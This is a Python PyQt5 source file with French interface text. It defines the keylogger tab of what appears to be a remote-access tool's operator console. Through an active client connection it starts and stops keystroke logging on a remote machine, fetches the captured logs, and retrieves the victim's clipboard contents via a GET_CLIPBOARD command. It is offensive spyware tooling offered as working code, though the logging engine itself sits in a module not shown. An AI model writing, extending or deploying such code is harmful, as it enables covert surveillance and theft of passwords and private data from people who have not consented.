# [file name]: keylogger_tab.py
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QPushButton, 
                            QTextEdit, QLabel, QHBoxLayout)
from core.keylogger_handler import KeyloggerHandler

class KeyloggerTab(QWidget):
    def __init__(self, connection_tab):
        super().__init__()
        self.connection_tab = connection_tab
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        self.status_label = QLabel("Keylogger prêt")
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        
        button_layout = QHBoxLayout()
        self.start_button = QPushButton("Démarrer")
        self.stop_button = QPushButton("Arrêter")
        self.get_logs_button = QPushButton("Récupérer les logs")
        self.get_clipboard_button = QPushButton("Récupérer Presse-papiers")  # Nouveau bouton
        
        self.start_button.clicked.connect(self.start_logging)
        self.stop_button.clicked.connect(self.stop_logging)
        self.get_logs_button.clicked.connect(self.get_logs)
        self.get_clipboard_button.clicked.connect(self.get_clipboard)  # Connexion du nouveau bouton
        
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        button_layout.addWidget(self.get_logs_button)
        button_layout.addWidget(self.get_clipboard_button)  # Ajout du bouton au layout
        
        layout.addWidget(self.status_label)
        layout.addLayout(button_layout)
        layout.addWidget(self.log_display)
        
        self.setLayout(layout)
        
    def start_logging(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        handler = KeyloggerHandler(self.connection_tab.client_handler)
        result = handler.start_logging()
        self.status_label.setText(result)
        
    def stop_logging(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        handler = KeyloggerHandler(self.connection_tab.client_handler)
        result = handler.stop_logging()
        self.status_label.setText(result)
        
    def get_logs(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        handler = KeyloggerHandler(self.connection_tab.client_handler)
        status, logs = handler.get_logs()
        self.status_label.setText(status)
        if logs:
            self.log_display.setPlainText(logs)
    
    def get_clipboard(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        try:
            # Envoyer une commande spéciale pour récupérer le presse-papiers
            clipboard_content = self.connection_tab.client_handler.send_command("GET_CLIPBOARD")
            if clipboard_content:
                self.log_display.append("\n[Presse-papiers]:\n" + clipboard_content + "\n")
                self.status_label.setText("[+] Contenu du presse-papiers récupéré")
            else:
                self.status_label.setText("[!] Presse-papiers vide ou erreur de récupération")
        except Exception as e:
            self.status_label.setText(f"[!] Erreur: {str(e)}")